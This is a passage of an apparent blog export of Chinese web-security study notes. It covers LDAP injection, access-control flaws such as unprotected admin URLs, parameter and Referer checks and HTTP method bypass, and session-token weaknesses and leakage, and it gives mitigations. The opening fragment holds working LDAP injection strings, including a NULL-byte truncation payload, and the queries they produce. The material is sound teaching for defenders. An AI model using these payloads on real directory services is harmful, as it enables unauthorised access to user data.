operator">=</span>London*<span class="token punctuation">))</span></code></pre><p>攻击者可以提交</p><pre class=" language-bash"><code class="language-bash">*<span class="token punctuation">))</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>givenName<span class="token operator">=</span>daf</code></pre><p>如果能将这个输入嵌入原始搜索过滤器中，将得到以下查询</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>givenName<span class="token operator">=</span>*<span class="token punctuation">))</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>givenName<span class="token operator">=</span>daf<span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token operator">=</span>London*<span class="token punctuation">))</span></code></pre><p>第一个过滤器包含一个通配符匹配条件，因此，结果也会返回所有信息</p><h5 id="NULL字节处理漏洞"><a href="#NULL字节处理漏洞" class="headerlink" title="NULL字节处理漏洞"></a>NULL字节处理漏洞</h5><p>针对合取查询的攻击多利用许多LDAP服务在处理NULL字节方面的漏洞。由于这些服务常常以本地代码编写，因此，搜索过滤器中的NULL字节将立即终止字符串，NULL之后的任何字符将被忽略。虽然LDAP本身不支持注释，但是采用NULL字节可以取得与SQL注释语句相同的效果<br>在上一个示例中，攻击者可以提交：</p><pre class=" language-bash"><code class="language-bash">*<span class="token punctuation">))</span>%00</code></pre><p>应用程序将%00序列解码成原义NULL字节，因此，查询将变为：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>givenName<span class="token operator">=</span>*<span class="token punctuation">))</span><span class="token punctuation">[</span>NULL<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token operator">=</span>London*<span class="token punctuation">))</span></code></pre><p>由于这个过滤器在NULL字节被截断，在LDAP看来，其中只包含一个通配符条件，因此会返回所有信息</p><h3 id="防止LDAP注入"><a href="#防止LDAP注入" class="headerlink" title="防止LDAP注入"></a>防止LDAP注入</h3><p>应根据一份可接受字符的“白名单”检查用户输入，其中最好只包括字母数字字符。应阻止任何可能破坏LDAP查询的字符，包括();,* | &amp; =和空字节</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(7)</title>
      <link href="/2019/11/05/websecurity7/"/>
      <url>/2019/11/05/websecurity7/</url>
      
        <content type="html"><![CDATA[<h2 id="访问控制机制"><a href="#访问控制机制" class="headerlink" title="访问控制机制"></a>访问控制机制</h2><p>从逻辑上讲，应用程序核心安全机制的访问控制建立在验证和会话管理之上。应用程序首先核实用户的身份，然后确认它收到的某个特殊的请求序列由该用户提出。应用程序之所以那么做，至少从安全上讲，是因为它必须决定是否允许某个请求执行特定的操作或访问它请求的资源。访问控制是应用程序的一个重要的防御机制，因为它们负责做出这些关键决定。如果访问控制存在缺陷，攻击者往往能够攻破整个应用程序，控制其管理功能并访问属于其他用户的敏感数据。<br>不完善的访问控制中最常见的Web应用程序漏洞存在的一个普遍原因在于，需要对每一个请求，以及特殊用户在特定时刻尝试对资源执行的每一项操作执行访问控制检查。而且，与许多其他类型的控制不同，这一设计决策需要由人做出，而无法采用技术解决。<br>访问控制漏洞的概念十分简单：应用程序允许攻击者执行某种攻击者没有资格执行的操作</p><h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><p>访问控制可分为三大类：垂直访问控制、水平访问控制和上下文相关的控制</p><ul><li>垂直访问控制允许各种类型的用户访问应用程序的不同功能。在最简单的情况下，应用程序通过这种控制界定普通用户与管理员。</li><li>水平访问控制允许用户访问一组类型相同的、内容及其广泛的资源。如，电子银行只允许转移自己账户内的资金</li><li>上下文相关的访问控制可确保基于应用程序当前的状态，将用户访问仅限于所允许的内容。如，在某个过程中，用户需要依照顺序完成多个阶段的操作，上下文相关的访问控制可以防止用户不按规定的顺序访问这些阶段。</li><li>许多时候，垂直与水平访问控制互相交叠。如，企业应该程序允许会计文员支付某一单位而非其他单位的发票，但允许付账经理支付任何单位的发票。财务总监能够查看公司每个组织单元的发票支付和收据，但不得支付任何发票。</li></ul><p>如果用户能够访问他无权访问的资源或功能，就表示访问控制存在缺陷。主要有三种与访问控制为目的的攻击，分别与三种访问控制对应：</p><ul><li>垂直权限提升：一名用户能够执行某项功能，但分配给他的角色并不具有这种权限。如，一名普通用户能够执行管理员的功能</li><li>水平权限提升：一名用户能够查看或修改他没有资格查看或修改的资源。如，用户使用Web邮件应用程序查看其他人的电子邮件</li><li>业务逻辑漏洞：用户可以利用应用程序状态机中的漏洞获得关键资源的访问权限。如，用户能够避开购物结算序列中的支付步骤</li></ul><p>许多时候，应用程序水平权限划分中存在的漏洞可能会立即引起垂直权限提升攻击。例如，如果一名用户能够以某种方式设置其他用户的密码，那么该用户就能攻击管理员的账户并控制整个应用程序</p><h3 id="完全不受保护的功能"><a href="#完全不受保护的功能" class="headerlink" title="完全不受保护的功能"></a>完全不受保护的功能</h3><p>在许多的访问控制不完善的情况下，敏感功能和数据可被任何知道相关URL的用户访问。例如，在许多应用程序中，任何人只需访问一个特定的URL就可以完全控制它的管理功能<br><font color="#fb8c00">https:// wahh-app.com/admin</font><br>在这种情况下，应用程序通常仅实施如下访问：以管理员身份登录的用户在他们的用户界面上看到一个该URL的链接，而其他用户无法看到这个链接。这种细微的差别是应用程序用于“防止”敏感功能被未授权使用的唯一机制<br>有时候，允许用户访问强大功能的URL可能很难猜测，甚至相当隐秘，如：<br><font color="#fb8c00">https:// wahh-app.com/menus/secure/ff457/DoAdminMenu2.jsp</font><br>这种情况下，开发者假设攻击者无法知道或发现这个URL。局外人很难攻破一个应用程序，因为他们不太可能猜测出实现这种目的的URL。</p><p>然而，攻击者仍然可以通过仔细检查客户端源代码仍能发现这些URL。许多应用程序使用JavaScript在客户端动态建立用户界面。它一般建立各种与用户状态有关的标记，然后根据这些标记在用户界面中增加不同的元素。如：</p><pre class=" language-bash"><code class="language-bash">var isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token keyword">if</span> <span class="token punctuation">(</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">{</span>    adminMenu.addItem<span class="token punctuation">(</span><span class="token string">"/menus/secure/ff457/addNewPortalUser2.jsp"</span>,<span class="token string">"Create a new user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在上述示例中，攻击者只需检查JavaScript代码就可以确定具备管理功能的URL，并尝试访问它们</p><h4 id="基于标识符的功能"><a href="#基于标识符的功能" class="headerlink" title="基于标识符的功能"></a>基于标识符的功能</h4><p>当应用程序使用一项功能访问某个特殊的资源时，被请求资源的标识符常常以请求参数的形式，在URL查询字符串或POST请求主体中提交给服务器。如，应用程序可能会使用下面的URL显示一份属于某个用户的特殊文档：<br><font color="#fb8c00">https:// wahh-app.com/ViewDocument.php?docid=1280149120</font><br>拥有这份文档的用户登录后，这个URL的链接将会在该用户的“我的文档”页面显示。其他用户无法看到这个链接。但是，如果访问控制不完善，那么请求URL的任何用户都能够像授权用户那样查看这份文档。<br>在上述示例中，寻求获得未授权访问的攻击者不仅需要知道应用程序的页面名称(ViewDocument.php)，而且需要知道他想要查看的文档的标识符。有时，应用程序生成的资源标识符非常难以预测，例如，它们可能是随机选择的GUID(Global Unique Indentifier，全局统一标识符)，也可能是连续生成的数字，但是，通常，希望发现其他用户资源标识符的攻击者可在应用程序的某个位置找到这些信息，例如访问日志中。</p><blockquote><p>注：应用程序日志是一个信息金矿，其中包含大量可被用作标识符的数据项，可利用它们探查通过标识符访问的功能。应用程序日志中常见的标识符包括：用户名、用户ID、账号、文档ID、用户群组与角色以及电子邮件</p></blockquote><h3 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h3><p>应用程序许多功能通过几个阶段执行，并在执行过程中由客户端向服务器发送许多请求。例如，添加新用户功能可能包括从用户维护菜单中选取这个选项，从下拉列表中选择部门和用户职位，然后添加新用户名、初始密码和其他信息。如果一名用户试图加载用户维护菜单并从中选取“创建新用户”选项，应用程序就会核实该用户是否拥有必要权限，如果用户未获授权，就阻止其进行访问。但是，如果攻击者直接进入核实用户所属部门和其他细节阶段，可能就没有有效的访问控制对其加以限制。开发者认为，任何达到验证过程后续阶段的用户一定已经拥有相关权限，因为前面的阶段已经验证了这些权限。通过这种方法，任何应用程序用户都能够添加一个新的管理用户账户，因而完全控制整个程序，访问许多其他已经实施完善的访问控制机制的功能。</p><h3 id="静态功能"><a href="#静态功能" class="headerlink" title="静态功能"></a>静态功能</h3><p>在绝大多数情况下，用户都是通过向在服务器上执行的动态页面发布请求来访问受保护的功能和资源。这时，每个动态页面负责执行适当的访问控制检查，并确认用户拥有执行相关操作所需的权限。<br>但是，有些时候，用户会直接向位于服务器Web根目录下的静态资源提出请求，要求访问这些被保护资源。如，一个在线出版商允许用户浏览他的书籍目录并购买电子书进行下载。支付费用后，应用程序就将用户指向以下URL：<br><font color="#fb8c00">https:// wahh-books.com/download/9780636628104.pdf</font><br>因为这是一个完全静态的资源，所以它并不在服务器上运行，它的内容直接由Web服务器返回。因此，资源自身并不能执行任何检查以确认提出请求的用户拥有必要权限。如果可以通过这种方式访问静态资源，那么这些资源很可能没有受到有效的访问控制机制的保护，任何知晓URL命名方案的人都可以利用这种缺陷访问任何所需的资源</p><h3 id="平台配置错误"><a href="#平台配置错误" class="headerlink" title="平台配置错误"></a>平台配置错误</h3><p>一些应用程序在Web服务器或应用程序平台层使用控件来控制访问。通常，应用程序会根据用户的角色来限制对特定URL路径的访问。例如，如果用户不属于管理员，访问/admin路径的请求可能会遭到拒绝。原则上，这是完全合法的访问控制方法，但是，如果在配置平台级控件时出现错误，就可能导致未授权访问。<br>正常情况下，平台级配置与防火墙策略规则类似，它们基于以下条件允许或拒绝访问请求：</p><ul><li>HTTP请求方法</li><li>URL路径</li><li>用户角色</li></ul><ol><li>如果用于创建新用户的管理功能使用POST方法，平台可能具有禁止POST方法并允许其他方法的拒绝规则。但是，如果应用程序级脚本并不验证针对此功能的所有请求是否使用POST方法，则攻击者就可以通过使用GET方法提交同一请求来避开这种控制。由于大多数用于检索请求参数的应用程序级API对于请求方法并无限制，因此，攻击者只需在GET请求中的URL查询字符串中提供所需参数，就可以未授权使用上述功能</li><li>即使平台级规则拒绝访问GET和POST方法，应用程序仍有可能易于受到攻击，这是因为，使用其他HTTP方法的请求可能最终由处理GET和POST请求的相同应用程序代码来处理。HEAD方法就是一个典型的例子。根据规范，服务器应使用这些代码来响应对应的GET请求的相同消息头(但不包含消息主体)来处理HEAD请求，即执行对应的GET处理程序并返回生产的HTTP消息头。如果攻击者能够使用HEAD请求增加一个管理用户账户，那么，即使在请求中未收到任何消息主体，他仍然能够成功实施攻击。</li><li>某些情况下，对于使用无法识别的HTTP方法的请求，平台会直接将它们将由GET请求处理程序处理。在这种情况下，通过在请求中指定任意无效的HTTP方法，就可以避开拒绝某些指定的HTTP方法的平台级控制。</li></ol><h3 id="访问控制方法不安全"><a href="#访问控制方法不安全" class="headerlink" title="访问控制方法不安全"></a>访问控制方法不安全</h3><p>一些应用程序使用一种极其不安全的访问控制模型：基于客户端提交的请求参数或受攻击者控制的其他条件做出访问控制决定。</p><h4 id="基于参数的访问控制"><a href="#基于参数的访问控制" class="headerlink" title="基于参数的访问控制"></a>基于参数的访问控制</h4><p>在一些这种模型中，应用程序在用户登录时决定用户的角色或访问级别，并在登录后通过隐藏表单字段、cookie或预先设定的查询字符串参数由客户端传送这些信息。应用程序在处理随后请求的过程中读取这个请求参数，并为用户分配相应的访问级别<br>例如，使用应用程序的管理员将看到以下URL：<br><font color="#fb8c00">https:// wahh-app.com/login/home.jsp?admin=true</font><br>但普通用户看到一个URL中包含一个不同的参数，或者根本不包含任何参数。任何知道分配给管理员的参数的用户只需在自己的请求中加入这个参数，就可以访问管理功能</p><h4 id="基于Referer的访问控制"><a href="#基于Referer的访问控制" class="headerlink" title="基于Referer的访问控制"></a>基于Referer的访问控制</h4><p>在其他不安全的访问控制模型中，应用程序使用HTTP Referer消息头做出访问控制决定。例如，应用程序会根据用户的权限，严格控制用户访问主维护菜单。但是，如果某名用户提出请求，要求访问某项管理功能，应用程序可能账户只是检查该请求是否由管理菜单页面提出的，如果确实由该页面提出，即认为该用户一定已经访问过那个页面，并因此已经拥有了必要的权限。</p><h4 id="基于位置的访问控制"><a href="#基于位置的访问控制" class="headerlink" title="基于位置的访问控制"></a>基于位置的访问控制</h4><p>根据用户的地理位置限制对资源的访问。在这种情况下，应用程序会采用各种方法来确定用户的位置，其中最常用的是用户当前的IP地址的地理位置。<br>攻击者能够轻易突破这种访问控制，常用方法如下：</p><ul><li>使用位于所需位置的Web代理服务器</li><li>使用在所需位置终止的VPN</li><li>使用支持数据漫游的移动设备</li><li>直接修改客户端用于确定地理位置的机制</li></ul><h2 id="攻击访问控制"><a href="#攻击访问控制" class="headerlink" title="攻击访问控制"></a>攻击访问控制</h2><h3 id="使用不同用户账户进行测试"><a href="#使用不同用户账户进行测试" class="headerlink" title="使用不同用户账户进行测试"></a>使用不同用户账户进行测试</h3><p>测试应用程序的访问控制效率最简单、最有效的方法，是使用其他账户访问应用程序。(使用Burp Suite的compare site map方法)</p><h3 id="测试多阶段过程"><a href="#测试多阶段过程" class="headerlink" title="测试多阶段过程"></a>测试多阶段过程</h3><p>在这个过程中的每一步骤都需要单独进行测试，以确认访问控制是否得到正确应用。</p><h2 id="保障访问控制的安全"><a href="#保障访问控制的安全" class="headerlink" title="保障访问控制的安全"></a>保障访问控制的安全</h2><ul><li>不要认为用户不知道用于指定应用程序资源的URL或标识符就无法访问这些资源</li><li>不要信任任何用户提交的表示访问权限的参数</li><li>不要认为用户将按设定的顺序访问应用程序页面</li><li>不要相信用户不会篡改通过客户端传送的数据</li><li>仔细评估并记录每个应用程序功能单元的访问控制要求</li><li>通过用户会话做出所有访问控制决定</li><li>使用一个中央应用程序组件检查访问控制</li><li>使用编程技巧确保前面的方法没有例外。一种有效的方法是规定每个应用程序页面必须采用一个由中央访问控制机制查询的界面。强制开发者将访问控制逻辑代码写入每个页面，不得找借口省略这些代码。</li></ul><h3 id="多层权限模型"><a href="#多层权限模型" class="headerlink" title="多层权限模型"></a>多层权限模型</h3><ul><li>可根据在应用程序服务器层面定义的用户角色，使用应用程序服务器的功能</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(6)</title>
      <link href="/2019/11/04/websecurity6/"/>
      <url>/2019/11/04/websecurity6/</url>
      
        <content type="html"><![CDATA[<h2 id="会话管理机制"><a href="#会话管理机制" class="headerlink" title="会话管理机制"></a>会话管理机制</h2><ul><li>在绝大多数的Web应用程序中，会话管理机制是一个基本的安全组件。它帮助应用程序从大量的不同请求中确认用户，并处理它收集的关于用户与应用程序交互状态的数据。</li><li>如果攻击这能够破坏应用程序的会话管理，他就能轻易避开其实施的验证机制，不需要用户证书即可伪装成其他应用程序的用户。<br>如果攻击者以这种方式攻破管理用户，那么他就能控制整个应用程序</li></ul><h2 id="状态要求"><a href="#状态要求" class="headerlink" title="状态要求"></a>状态要求</h2><ul><li>从本质上讲，HTTP没有状态，它是一种基于简单的请求-响应模型，其中每对消息代表一个独立的事务。协议本身并无将某位用户提出的各种请求联系起来的机制，并将它们与Web服务器收到的所有其他请求区分开来。</li><li>绝大多数的Web“站点”实际为Web应用程序，它们允许用户注册和登录，帮助用户购买及销售产品。它们能够在用户下次访问时记住他的喜好。它们可根据用户的单击和输入，通过动态建立的内容提供丰富、多媒体形式的使用体验，为执行这些功能，应用程序就要使用会话。</li><li>支持登录是会话在应用程序中最主要的用途。输入用户名和密码以后，可以用输入的证书所属的用户身份使用应用程序，直到退出会话或由于会话处于非活动状态而终止。用户不希望在每个应用程序页面重复输入密码，因此，用户一旦通过验证，应用程序就会为他建立一个会话，把所有属于这个会话的请求当做该用户提出的请求处理</li><li>不具备登录功能的应用程序通常也需要使用会话。许多出售商品的站点并不要求客户建立账户，但是，它们允许用户浏览目录、往购物篮中添加商品。在这种情况下，就没必要验证用户的身份，但是，为了和用户进行交易，应用程序需要直到它收到的哪些请求来自同一名用户。</li><li>执行会话最简单、最常见的方法就是向每名用户发布一个唯一的会话令牌或标识符。用户在随后向应用程序提出的每一个请求中提交这个令牌，帮助应用程序在当前的请求与前面提出的请求之间建立关联。</li><li>绝大多数情况下，应用程序使用HTTP cookie作为在服务器和客户端件传送这些会话令牌的传输机制。服务器对新客户端的第一个响应中包含以下HTTP消息头：<font color="#fb8c00">Set-Cookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55</font> 客户端随后提出的请求中包含以下信息头：<br><font color="#fb8c00">Cookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55</font></li><li>会话管理机制中存在的漏洞主要分为两类：</li></ul><ol><li>会话令牌生成过程中的薄弱环节</li><li>在整个生命周期过程中处理会话令牌的薄弱环节</li></ol><h3 id="会话替代方案"><a href="#会话替代方案" class="headerlink" title="会话替代方案"></a>会话替代方案</h3><p>并非每一种Web应用程序都使用会话，一些具备验证机制、功能复杂的安全性至关重要的应用程序选择使用其他技术管理状态。常见的会话替代方案有两种:</p><h4 id="HTTP验证"><a href="#HTTP验证" class="headerlink" title="HTTP验证"></a>HTTP验证</h4><p>使用各种基于HTTP验证技术(基本、摘要、NTML验证等)的应用程序有时避免使用会话。</p><ul><li>在HTTP验证中，客户端组件使用HTTP消息头通过浏览器直接与验证机制交互</li><li>一旦用户在浏览器对话框中输入他的证书，浏览器将会在随后向同一服务器提出的每个请求中重复提交这些证书(或重复执行任何有必要的握手)。这种做法等同于应用程序使用基于HTML表单的验证，并且在每个应用程序页面插入一个登录表单，要求用户通过他们执行的每一项操作重复验证自己的身份</li></ul><h4 id="无会话状态机制"><a href="#无会话状态机制" class="headerlink" title="无会话状态机制"></a>无会话状态机制</h4><p>一些应用程序并不发布会话令牌管理用户与应用程序的交互状态，而是传送所有必要数据(一般保存在cookie或隐藏表单字段中)，由客户端管理状态。</p><ul><li>这种机制以类似于ASP.NET ViewState的方式使用无会话状态。</li><li>为保证这种机制的安全，必须对通过客户端传送的数据进行保护。这通常要求建立一个包含所有状态信息的二进制巨对象，并使用一种公认的算法对这些数据进行加密或签名。</li><li>还必须在数据中包含足够的上下文，以防止攻击者将在应用程序某个位置收集到的状态对象提交到另一个位置造成意外行为</li></ul><h2 id="会话令牌生成过程中的薄弱环节"><a href="#会话令牌生成过程中的薄弱环节" class="headerlink" title="会话令牌生成过程中的薄弱环节"></a>会话令牌生成过程中的薄弱环节</h2><p>许多时候，应用程序的安全取决于它所生产的令牌的不可预测性，以下是一些示例：</p><ul><li>发送到用户注册的电子邮箱的密码恢复令牌</li><li>隐藏表单字段中用于防止跨站点请求伪造攻击的令牌(请参阅Web安全(10))</li><li>用于一次性访问受保护的资源的令牌</li><li>“记住我”功能使用的永久令牌</li></ul><h3 id="令牌有一定含义"><a href="#令牌有一定含义" class="headerlink" title="令牌有一定含义"></a>令牌有一定含义</h3><p>一些会话令牌通过用户的用户名或者是电子邮件地址转换过来，或者使用与其相关的其他信息创建。这些信息可以以某种方式进行编码或模糊处理，也可与其他数据结合在一起<br>例如，初看起来，下面的令牌由一长串随机字符组成：<br> <font color="#fb8c00">757365723d6461663b6170703d61646d696e3b64617453d30312f31322f3131</font><br> 但是，仔细分析后，其中仅包含十六进制字符，猜想这是一个经过十六进制编制的ASCII字符串，我们使用解码器对其解码，发现它实际是：<br>  <font color="#fb8c00">user=daf;app=admin;date=10/09/11</font></p><ul><li>攻击者可以利用这个会话令牌的含义猜测其他应用程序用户当前的会话。使用一组枚举出的用户名或常见用户名，就能够迅速生成大量可能有效的令牌，并进行测试以确定它们是否有效</li><li>包含有含义数据的令牌通过表现出某种结构，它们以几种成分组成，通常以分隔符隔开，攻击者可分别提取并分析这些成分，以了解它们的功能与生成方法。结构化令牌的组成成分包括以下几项：</li></ul><ol><li>账户用户名</li><li>应用程序用来区分账户的数字标识符</li><li>用户姓名中的名/姓</li><li>用户的电子邮件地址</li><li>用户在应用程序中所属的组或扮演的角色</li><li>日期/时间戳</li><li>一个递增或可预测的数字</li><li>客户端的IP地址<br>为特意对其内容进行模糊处理，或者是为了确保二进制数据能通过HTTP安全传输，应用程序会对结构化令牌中的不同成分或整个令牌以不同的方式进行编码，常用的编码方案包括XOR、Base64和使用ASCII字符的十六进制表示法。未将其恢复到原始状态，可能有必要对结构化令牌的每一个成分使用各种不同的解码方法。</li></ol><h3 id="令牌可预测"><a href="#令牌可预测" class="headerlink" title="令牌可预测"></a>令牌可预测</h3><p>一些会话令牌并不包含与某个特定用户有关的任何有意义的数据，但由于它们包含某种顺序或模式，允许攻击者通过几个令牌样本即可推断出应用程序最近发布的其他有效令牌，因此具有可预测性。</p><ul><li>与定制应用程序相比，会话管理的商业应用（如Web服务器或Web应用程序平台)中的令牌可预测漏洞更容易发现。</li><li>可预测的会话令牌通常来自3个方面：</li></ul><ol><li>隐含序列</li><li>时间依赖</li><li>生成的数字随机性不强</li></ol><h4 id="隐含序列"><a href="#隐含序列" class="headerlink" title="隐含序列"></a>隐含序列</h4><p>对会话令牌进行适当解码或解译就可以揭示其中包含的序列</p><h4 id="时间依赖"><a href="#时间依赖" class="headerlink" title="时间依赖"></a>时间依赖</h4><p>一些Web服务器和应用程序使用时间作为令牌值的输入，通过某种算法生成会话令牌。</p><h4 id="生成的数字随机性不强"><a href="#生成的数字随机性不强" class="headerlink" title="生成的数字随机性不强"></a>生成的数字随机性不强</h4><p>计算机中的数据极少完全随机，因此，如果由于某种原因需要随机数据，一般通过软件使用各种技巧生成伪随机数字。</p><h4 id="测试随机性强度"><a href="#测试随机性强度" class="headerlink" title="测试随机性强度"></a>测试随机性强度</h4><p>可以使用Burp Suite的Sequencer测试Web应用程序令牌随机性(请参考博客Burp Suite)。</p><h3 id="加密令牌"><a href="#加密令牌" class="headerlink" title="加密令牌"></a>加密令牌</h3><p>一些应用程序使用包含用户有意义信息的令牌，并通过在向用户发布令牌之前对令牌进行加密来避免问题。</p><h4 id="ECB密码"><a href="#ECB密码" class="headerlink" title="ECB密码"></a>ECB密码</h4><p>采用加密令牌的应用程序采用对称加密算法，用于解密用户返回的令牌，恢复令牌中有意义的内容。一些对称加密算法使用“电子密码本”(ECB)密码。</p><ul><li>这种密码在加密时将明文分为同等大小的分组(如每组8字节)，然后使用密钥加密每个分组。</li><li>在解密时，再使用相同的密钥对每个密文分组进行解密</li><li>特点：如果明文分组存在某种模式，这可能导致密文分组也存在某种模式，因为明文分组与加密后的密文分组完全相同。对于某些类型的数据(如位图图像)而言，这意味着可以从密文中判断明文中的有意义信息。</li></ul><h4 id="CBC密码-密码快链密码"><a href="#CBC密码-密码快链密码" class="headerlink" title="CBC密码(密码快链密码)"></a>CBC密码(密码快链密码)</h4><p>使用CBC密码时，在加密每个明文分组前，将它与前一个密文分组进行异或运算,这样，同一个明文分组就不会被加密成同一个密文分组。解密时逆向执行XOR运算，每个解密的分组将与前一个密文分组进行XOR运算，以恢复原始的明文。<br><img src="https://i.postimg.cc/6pzpmz0S/cbc.png" alt=""></p><h2 id="会话令牌处理中的薄弱环节"><a href="#会话令牌处理中的薄弱环节" class="headerlink" title="会话令牌处理中的薄弱环节"></a>会话令牌处理中的薄弱环节</h2><h3 id="在网络上泄露令牌"><a href="#在网络上泄露令牌" class="headerlink" title="在网络上泄露令牌"></a>在网络上泄露令牌</h3><ul><li>一些应用程序在登录阶段选择使用HTTPS保护用户证书的安全，但在用户会话的其他阶段转而使用HTTP。在这种情况下，窃听者无法拦截用户的证书，但仍然可以截获会话令牌。Firefox的插件Firesheep工具会使这一过程变得轻而易举。</li><li>一些应用程序在站点预先通过验证的区域(如站点首页)使用HTTP，但从登录页面开始转换成HTTPS。许多时候，应用程序在访问第一个页面时就给他发布一个会话令牌，并且用户在登录时也不会修改这个令牌。最初未通过验证的用户会话在登录后却被升级为通过验证的会话。在这种情况下，窃听者就可以在登录前拦截用户的令牌，等待用户转换到HTTPS进行通信(表示用户正在登录)然后尝试使用那个令牌访问一个受保护的页面(如“我的账户”)</li><li>即使应用程序在用户成功登录后发布一个新的令牌，并从登录页面开始使用HTTPS，但是，如果用户通过单击验证区域中的一个链接、使用“后退”按钮或者直接输入URL，重新访问一个预先验证的页面(如“帮助”或“关于”页面)，用户用于验证的会话令牌仍然可能会泄露。</li><li>与前面的情况不同，应用程序可能在用户单击登录链接后转换到HTTPS。然而，如果用户对URL进行相应的修改，应用程序仍然接受通过HTTP进行登录。这时，处在适当位置的攻击者就可以修改站点预先通过验证的区域返回的页面，使登录链接指向一个HTTP页面，即使应用程序在用户成功登录后发布一个新令牌，如果攻击者已成功将用户的链接降级为HTTP，他仍然能够拦截这个令牌</li><li>一些应用程序对应用程序中全部静态内容(如图像、脚本、样式表和页面模板)使用HTTP，如果出现这种行为，用户的浏览器将显示一条警告信息，如下图。当浏览器显示此警告时，它已经通过HTTP获取了相关数据项，因此已经传送了会话令牌，浏览器显示警告是为了让用户拒绝处理已通过HTTP接收到并因此可能受到污染的响应数据。如上所述，攻击者可以在此过程中拦截会话令牌。<br><img src="https://i.postimg.cc/6qsWvPW7/security.jpg" alt=""></li><li>即使应用程序在每一个页面(包括站点中未通过验证的区域和静态内容)都使用HTTPS，有些情况下，用户的令牌仍然通过HTTP传送。如果攻击者能够以某种方式诱使用户通过HTTP提出一个请求(或者是请求相同服务器上运行的HTTP服务，或者是访问<font color="#fb8c00"><a href="http://server:443/" target="_blank" rel="noopener">http://server:443/</a>)</font>，那么用户就可能在这个过程中提交令牌。这时，攻击者可以采用的攻击手段包括在一封电子邮件或即时消息中给用户发送一个URL，在他控制的一个Web站点中插入一个自动加载的链接，或者使用可单击的横幅广告。</li></ul><h3 id="在日志中泄露令牌"><a href="#在日志中泄露令牌" class="headerlink" title="在日志中泄露令牌"></a>在日志中泄露令牌</h3><p>许多应用程序为管理员和其他支持人员提供监控和控制应用程序运行时的状态(包括用户会话功能)。例如，帮助用户解决疑难的服务台工作人员可能会要求用户提供用户名、通过列表或搜索功能定位他们当前的会话，并查看与会话有关的细节。或者管理员在调查一起违反安全事件的过程中查询最近会话的日志记录。通常，这种监控和控制功能会泄露每个会话的令牌。<br>会话令牌出现在系统日志中的另一个主要原因是应用程序使用URL查询字符串，而不是使用HTTP cookie或POST请求主体作为令牌传输机制。如果应用程序以这种方式传送会话令牌，它们的会话令牌就可能出现在各种未授权用户能够访问的系统日志中，如：</p><ul><li>用户浏览器日志</li><li>Web服务器日志</li><li>企业或ISP代理服务器日志</li><li>任何在应用程序主机环境中采用反向代理的日志</li><li>应用程序用户通过单击站外链接访问的任何服务器Referer日志(当会话令牌出现在URL中，只要用户点击站外链接或浏览器加载站外资源，会话令牌就会在Referer消息头中传送)</li></ul><h3 id="令牌-会话映射易受攻击"><a href="#令牌-会话映射易受攻击" class="headerlink" title="令牌-会话映射易受攻击"></a>令牌-会话映射易受攻击</h3><p>会话管理机制的常见漏洞：</p><ul><li>运行给同一个用户同时分配几个有效的令牌。在几乎每一个应用程序中，任何用户都没有正当理由在任何指定的时间拥有多个会话。如果一个用户明显同时在使用两个不同的会话，这通常表示出现了安全问题：要么是因为用户将证书泄露给了第三方，要么是攻击者通过某种途径获得了用户的证书。不论是哪一种，都不应允许并行会话，因为它允许用户持续执行任何非法操作，同时允许攻击者使用截获的证书，却不存在被检测出来的风险。</li><li>应用程序使用“静态”令牌，这些令牌看似会话令牌，最初表现的功能与会话令牌一样，但实际并非如此。在这些应用程序中，每名用户都分配有一个令牌，并且用户每次登录，都会收到相同的令牌。无论用户是否已经登录并获取令牌，应用程序都将该令牌视为有效令牌。(大多数情况下这种机制都是为了实现“记住我”功能)</li></ul><h3 id="会话终止易受攻击"><a href="#会话终止易受攻击" class="headerlink" title="会话终止易受攻击"></a>会话终止易受攻击</h3><p>正确终止会话非常重要，其原因有两个方面：</p><ol><li>尽可能缩短一个会话的寿命可降低攻击者截获、猜测或滥用有效会话令牌的可能性。</li><li>在某种程度上确保共享计算环境中会话的安全<br>一些应用程序并不提供有效的退出功能：</li></ol><ul><li>有些时候，应用程序根本不执行退出功能，用户无法要求应用程序终止会话</li><li>有些时候，退出功能实际上并不能帮助服务器终止会话，即使服务器从用户的浏览器中删除令牌(例如，通过发布一个清空令牌的Set-Cookie指令)。然而，如果用户继续提交这个令牌，服务器仍然接收</li><li>最糟糕的情况下，当用户单击“退出”按钮时，应用程序并不与服务器通信，因此服务器不采取任何行动。相反，应用程序执行一段客户端脚本清空用户的cookie，在随后的请求中将用户返回到登录页面。访问这个cookie的攻击者就能使用会话，好像用户从未退出一样。</li></ul><h3 id="客户端暴露在令牌劫持风险之中"><a href="#客户端暴露在令牌劫持风险之中" class="headerlink" 